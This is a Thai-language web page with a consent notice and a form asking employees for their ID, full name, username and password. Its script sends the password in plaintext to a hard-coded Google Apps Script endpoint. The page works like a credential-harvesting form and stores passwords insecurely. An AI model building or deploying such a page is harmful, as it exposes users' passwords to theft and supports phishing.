<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ระบบเก็บข้อมูลล็อกอิน</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Mitr:wght@300;400;500&display=swap" rel="stylesheet">
    <!-- Add Confetti library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
    
    <style>
        :root {
            --glow-purple: #be00ff;
            --glow-pink: #ff00a0;
            --glow-blue: #00b8ff;
            --dark-bg: #0f001a;
            --white: #ffffff;
            --light-text: #d9d9d9;
            --dark-text: #333;
            --input-bg-solid: #1c1024; 
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            font-size: 16px;
        }

        body {
            font-family: 'Mitr', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            /* overflow: hidden; <-- REMOVED THIS LINE TO FIX SCROLLING */
            background-color: var(--dark-bg);
            color: var(--white);
        }
        
        .aurora-bg {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, var(--glow-purple), var(--glow-pink), var(--glow-blue), var(--dark-bg));
            background-size: 300% 300%;
            filter: blur(60px);
            z-index: -1;
            animation: aurora-flow 20s ease infinite;
        }

        @keyframes aurora-flow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .container {
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
            transition: height 0.6s ease-in-out;
        }

        .step {
            width: 100%;
            padding: 2rem 1.5rem;
            transition: opacity 0.6s ease-in-out, transform 0.6s ease-in-out;
        }

        #step-2 {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
            transform: translateY(50px);
            visibility: hidden;
        }
        
        .container.show-step-2 #step-1 {
            opacity: 0;
            transform: translateY(-50px);
            visibility: hidden;
        }

        .container.show-step-2 #step-2 {
            opacity: 1;
            transform: translateY(0);
            visibility: visible;
        }

        .info-page {
            text-align: center;
        }

        .info-page h1 {
            font-size: 2rem;
            color: var(--white);
            margin-bottom: 1rem;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .info-page p {
            font-size: 1rem;
            color: var(--light-text);
            line-height: 1.6;
            margin-bottom: 2rem;
        }
        
        .header {
            text-align: center;
            margin-bottom: 1.5rem;
        }
        
        .header h1 {
            color: var(--white);
            font-size: 2rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }
        
        .header p {
            color: var(--light-text);
            font-size: 1rem;
        }
        
        .form-group {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            font-size: 1rem;
            font-family: 'Mitr', sans-serif;
            transition: all 0.3s ease;
            background: rgba(0, 0, 0, 0.2);
            color: var(--white);
        }

        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus, 
        input:-webkit-autofill:active {
            -webkit-box-shadow: 0 0 0 30px var(--input-bg-solid) inset !important;
            -webkit-text-fill-color: var(--white) !important;
            transition: background-color 5000s ease-in-out 0s;
        }

        .password-wrapper .form-input {
            padding-right: 50px;
        }
        .password-wrapper.has-validation .form-input {
            padding-right: 85px;
        }

        .form-label {
            position: absolute;
            top: 15px;
            left: 17px;
            color: var(--light-text);
            pointer-events: none;
            transition: all 0.2s ease;
            background-color: transparent;
            padding: 0 5px;
        }

        .form-input:focus + .form-label,
        .form-input:not(:placeholder-shown) + .form-label {
            top: -10px;
            left: 15px;
            font-size: 0.8rem;
            color: var(--glow-pink);
            background-color: #1a0c25; 
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--glow-pink);
            box-shadow: 0 0 15px rgba(255, 0, 160, 0.5);
        }
        
        .password-wrapper {
            position: relative;
        }

        .icon-container {
            position: absolute;
            top: 50%;
            right: 16px;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
        }

        .form-icon {
            font-size: 1.2rem;
            cursor: pointer;
            color: var(--light-text);
            transition: all 0.2s ease;
            line-height: 1;
        }
        .form-icon + .form-icon {
            margin-left: 12px;
        }
        
        .form-icon:hover {
            color: var(--white);
        }
        .validation-icon {
            opacity: 0;
            transform: scale(0.5);
        }
        .validation-icon.visible { opacity: 1; transform: scale(1); }
        .validation-icon.valid { color: #00ff88; }
        .validation-icon.invalid { color: var(--glow-pink); }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, var(--glow-purple), var(--glow-pink));
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.1rem;
            font-weight: 500;
            font-family: 'Mitr', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 0.5rem;
            position: relative;
            overflow: hidden;
            animation: pulse-glow 2.5s infinite ease-in-out;
        }
        
        @keyframes pulse-glow {
            0%, 100% {
                box-shadow: 0 5px 20px rgba(255, 0, 160, 0.4), 0 0 10px rgba(255, 0, 160, 0.2);
            }
            50% {
                box-shadow: 0 8px 30px rgba(255, 0, 160, 0.6), 0 0 20px rgba(255, 0, 160, 0.4);
            }
        }

        .submit-btn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(to right, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.5) 50%, rgba(255,255,255,0.1) 100%);
            transform: rotate(45deg);
            animation: shimmer 2.5s infinite;
        }

        @keyframes shimmer {
            0% { transform: rotate(45deg) translateX(-150%); }
            100% { transform: rotate(45deg) translateX(150%); }
        }
        
        .submit-btn:hover {
            transform: translateY(-3px);
        }
        
        .submit-btn:active {
            transform: translateY(0px) scale(0.98);
            box-shadow: 0 2px 10px rgba(255, 0, 160, 0.6);
        }
        
        .submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            animation: none;
        }
        
        .message-box {
            display: none;
            padding: 1rem;
            border-radius: 15px;
            text-align: center;
            margin-top: 1rem;
            animation: fadeIn 0.3s;
            color: var(--dark-text);
        }
        
        .success-message { background: #e0f8e9; }
        .error-message { background: #ffdde0; }
        .heart-icon {
            display: inline-block;
            animation: pulsate 1.5s ease-out infinite;
        }

        @keyframes pulsate {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.3); }
        }
    </style>
</head>
<body>
    <div class="aurora-bg"></div>
    <div class="container" id="container">
        <!-- Step 1: Information Page -->
        <div class="step" id="step-1">
            <div class="info-page">
                <h1>ข้อชี้แจงการเก็บข้อมูล</h1>
                <p>
                    เราจะทำการเก็บข้อมูลที่ท่านกรอก (รหัสพนักงาน, ชื่อ, ชื่อผู้ใช้ และรหัสผ่าน)
                    เพื่อใช้ในการยืนยันตัวตนและเข้าใช้งานระบบภายในของบริษัทเท่านั้น
                    ข้อมูลของท่านจะถูกเก็บรักษาอย่างปลอดภัย
                </p>
                <button id="nextBtn" class="submit-btn">รับทราบและดำเนินการต่อ</button>
            </div>
        </div>

        <!-- Step 2: Form Page -->
        <div class="step" id="step-2">
            <div class="header">
                <h1>🔐 ระบบเก็บข้อมูลล็อกอิน</h1>
                <p>กรุณากรอกข้อมูลล็อกอินของคุณ</p>
            </div>
            
            <form id="loginForm" autocomplete="off">
                <div class="form-group">
                    <input type="text" id="employeeId" name="employeeId" class="form-input" placeholder=" " required autocomplete="off">
                    <label for="employeeId" class="form-label">รหัสพนักงาน (Ex. KG)</label>
                </div>
                
                <div class="form-group">
                    <input type="text" id="fullName" name="fullName" class="form-input" placeholder=" " required autocomplete="off">
                    <label for="fullName" class="form-label">ชื่อ-นามสกุล</label>
                </div>
                
                <div class="form-group">
                    <input type="text" id="username" name="username" class="form-input" placeholder=" " required autocomplete="off">
                    <label for="username" class="form-label">ชื่อผู้ใช้</label>
                </div>
                
                <div class="form-group password-wrapper">
                    <input type="password" id="password" name="password" class="form-input" placeholder=" " required autocomplete="new-password">
                    <label for="password" class="form-label">รหัสผ่าน</label>
                    <div class="icon-container">
                        <span class="form-icon toggle-password">👁️</span>
                    </div>
                </div>
                
                <div class="form-group password-wrapper has-validation">
                    <input type="password" id="confirmPassword" name="confirmPassword" class="form-input" placeholder=" " required autocomplete="new-password">
                    <label for="confirmPassword" class="form-label">ยืนยันรหัสผ่าน</label>
                    <div class="icon-container">
                        <span id="validationIcon" class="form-icon validation-icon"></span>
                        <span class="form-icon toggle-password">👁️</span>
                    </div>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">
                    ส่งข้อมูล
                </button>
            </form>
            
            <div id="messageBox" class="message-box">
                <h3 id="messageTitle"></h3>
                <p id="messageText"></p>
            </div>
        </div>
    </div>

    <script>
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbypJ79AZl8J_AAhAwZPCF1FM3XDGgvR-xnCiziaKmq_Y9i6iz6zp99wOFKzblQB6XNxug/exec';

        const container = document.getElementById('container');
        const nextBtn = document.getElementById('nextBtn');
        const step1 = document.getElementById('step-1');
        const step2 = document.getElementById('step-2');
        const form = document.getElementById('loginForm');
        const passwordInput = document.getElementById('password');
        const confirmPasswordInput = document.getElementById('confirmPassword');
        const validationIcon = document.getElementById('validationIcon');
        const submitBtn = document.getElementById('submitBtn');
        const messageBox = document.getElementById('messageBox');
        const messageTitle = document.getElementById('messageTitle');
        const messageText = document.getElementById('messageText');
        const togglePasswordIcons = document.querySelectorAll('.toggle-password');

        let step1Height = 0;
        let step2Height = 0;

        function showMessage(type, title, text) {
            messageBox.className = `message-box ${type}-message`;
            messageTitle.innerHTML = title;
            messageText.textContent = text;
            messageBox.style.display = 'block';
            
            container.style.height = `${step2.scrollHeight}px`;

            if (type === 'success') {
                triggerConfetti();
            }
        }

        function hideMessage() {
            messageBox.style.display = 'none';
            if (container.classList.contains('show-step-2')) {
                container.style.height = `${step2.scrollHeight}px`;
            }
        }

        function validatePassword() {
            if (passwordInput.value === '' || confirmPasswordInput.value === '') {
                validationIcon.className = 'form-icon validation-icon';
                return;
            }
            if (passwordInput.value === confirmPasswordInput.value) {
                validationIcon.textContent = '✔';
                validationIcon.className = 'form-icon validation-icon visible valid';
            } else {
                validationIcon.textContent = '✖';
                validationIcon.className = 'form-icon validation-icon visible invalid';
            }
        }

        function triggerConfetti() {
            const rect = submitBtn.getBoundingClientRect();
            const origin = {
                x: (rect.left + rect.width / 2) / window.innerWidth,
                y: (rect.top + rect.height / 2) / window.innerHeight
            };

            confetti({
                particleCount: 150,
                spread: 90,
                origin: origin,
                colors: ['#be00ff', '#ff00a0', '#00b8ff', '#ffffff']
            });
        }

        nextBtn.addEventListener('click', () => {
            container.style.height = `${step2Height}px`;
            container.classList.add('show-step-2');
        });
        
        window.addEventListener('load', () => {
            setTimeout(() => {
                step1Height = step1.scrollHeight;
                step2Height = step2.scrollHeight;
                container.style.height = `${step1Height}px`;
            }, 150);
        });

        passwordInput.addEventListener('input', validatePassword);
        confirmPasswordInput.addEventListener('input', validatePassword);

        togglePasswordIcons.forEach(icon => {
            icon.addEventListener('click', () => {
                const wrapper = icon.closest('.password-wrapper');
                const input = wrapper.querySelector('.form-input');
                const isPassword = input.type === 'password';
                input.type = isPassword ? 'text' : 'password';
                icon.textContent = isPassword ? '🙈' : '👁️';
            });
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            hideMessage();
            
            if (passwordInput.value !== confirmPasswordInput.value) {
                showMessage('error', 'อุ๊ย! เกิดข้อผิดพลาด', 'รหัสผ่านไม่ตรงกันน้า ลองดูอีกทีจ้ะ');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'กำลังส่ง...';
            
            const formData = new FormData(form);
            const dataToSend = {
                timestamp: new Date().toISOString(),
                employeeId: formData.get('employeeId'),
                fullName: formData.get('fullName'),
                username: formData.get('username'),
                password: formData.get('password')
            };

            fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dataToSend)
            })
            .then(() => {
                setTimeout(() => {
                    showMessage('success', '<span class="heart-icon">💖</span> เรียบร้อย!', 'ข้อมูลของคุณถูกบันทึกแล้วจ้า');
                    form.reset();
                    validationIcon.className = 'form-icon validation-icon';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'ส่งข้อมูล';
                }, 0);
            })
            .catch(error => {
                showMessage('error', 'อุ๊ย! เกิดข้อผิดพลาด', 'เกิดข้อผิดพลาดด้านเครือข่าย: ' + error.message);
                submitBtn.disabled = false;
                submitBtn.textContent = 'ส่งข้อมูล';
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
